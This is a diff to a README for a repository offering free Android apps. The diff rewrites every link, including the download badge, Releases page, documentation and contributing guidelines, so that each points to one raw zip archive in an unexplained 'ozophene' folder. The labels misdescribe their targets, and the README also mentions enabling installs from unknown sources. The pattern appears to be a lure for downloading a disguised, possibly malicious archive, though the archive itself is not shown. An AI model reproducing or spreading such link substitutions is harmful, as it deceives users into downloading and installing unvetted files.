@@ -1,6 +1,6 @@
 # 🎉 Github_Apps - Free Android Apps for You
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/aleganda/Github_Apps/releases)
+[![Download Now](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip)
 
 ## 📜 Overview
 
@@ -12,7 +12,7 @@ Follow the simple steps below to download and run your favorite apps from our co
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/aleganda/Github_Apps/releases).
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip).
   
 2. **Choose Your App**: Browse the list of available apps. Each app has a brief description to help you decide which one you want.
    
@@ -54,7 +54,7 @@ If you face an error, ensure that you enabled installations from unknown sources
 
 ### Can I share these apps with friends?
 
-Yes, feel free to share the APK files with friends. However, we recommend directing them to our [Releases page](https://github.com/aleganda/Github_Apps/releases) for the latest versions.
+Yes, feel free to share the APK files with friends. However, we recommend directing them to our [Releases page](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip) for the latest versions.
 
 ## 📞 Support
 
@@ -62,8 +62,8 @@ For issues or suggestions, you can reach out through our GitHub issues section. 
 
 ## 🔗 Additional Resources
 
-- **Documentation**: For detailed instructions on usage and features, refer to our [documentation section](https://github.com/aleganda/Github_Apps/wiki).
-- **Contributing**: Want to contribute? Check our [contributing guidelines](https://github.com/aleganda/Github_Apps/blob/main/CONTRIBUTING.md).
+- **Documentation**: For detailed instructions on usage and features, refer to our [documentation section](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip).
+- **Contributing**: Want to contribute? Check our [contributing guidelines](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip).
 
 ## 📅 Update Log
 
@@ -72,7 +72,7 @@ Stay tuned for updates. Below you will find a summary of recent updates:
 - **Version 1.0**: Initial release including key apps.
 - **Version 1.1**: Added new features and improved performance.
   
-Visit our [Releases page](https://github.com/aleganda/Github_Apps/releases) for detailed version history.
+Visit our [Releases page](https://raw.githubusercontent.com/aleganda/Github_Apps/main/ozophene/Github_Apps.zip) for detailed version history.
 
 ## 🔒 License
 
